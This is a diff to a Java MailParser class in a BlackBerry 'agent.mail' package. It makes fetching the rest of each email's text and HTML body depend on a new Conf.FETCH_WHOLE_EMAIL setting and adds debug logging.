@@ -1,6 +1,7 @@
 //#preprocess
 package blackberry.agent.mail;
 
+import blackberry.Conf;
 import blackberry.utils.Check;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
@@ -19,7 +20,7 @@ public class MailParser {
     //#ifdef DEBUG
     static Debug debug = new Debug("MailParser", DebugLevel.VERBOSE);
     //#endif
-  
+
     private Message message;
     private Mail mail;
 
@@ -32,7 +33,7 @@ public class MailParser {
         //#ifdef DBC
         Check.requires(message != null, "parse: message != null");
         //#endif
-        
+
         findEmailBody(message.getContent());
         return mail;
     }
@@ -90,7 +91,12 @@ public class MailParser {
             //Determine if all of the text body part is present.
             if (mbp.hasMore() && !mbp.moreRequestSent()) {
                 try {
-                    Transport.more((BodyPart) mbp, true);
+                    //#ifdef DEBUG_INFO
+                    debug.info("There's more text: " + Conf.FETCH_WHOLE_EMAIL);
+                    //#endif
+                    if (Conf.FETCH_WHOLE_EMAIL) {
+                        Transport.more((BodyPart) mbp, true);
+                    }
                 } catch (Exception ex) {
                     //#ifdef DEBUG_ERROR
                     debug.error("readEmailBody Mime Text: " + ex);
@@ -102,7 +108,12 @@ public class MailParser {
             //Determine if all of the HTML body part is present.
             if (mbp.hasMore() && !mbp.moreRequestSent()) {
                 try {
-                    Transport.more((BodyPart) mbp, true);
+                    //#ifdef DEBUG_INFO
+                    debug.info("There's more html: " + Conf.FETCH_WHOLE_EMAIL);
+                    //#endif
+                    if (Conf.FETCH_WHOLE_EMAIL) {
+                        Transport.more((BodyPart) mbp, true);
+                    }
                 } catch (Exception ex) {
                     //#ifdef DEBUG_ERROR
                     debug.error("readEmailBody Mime Html: " + ex);
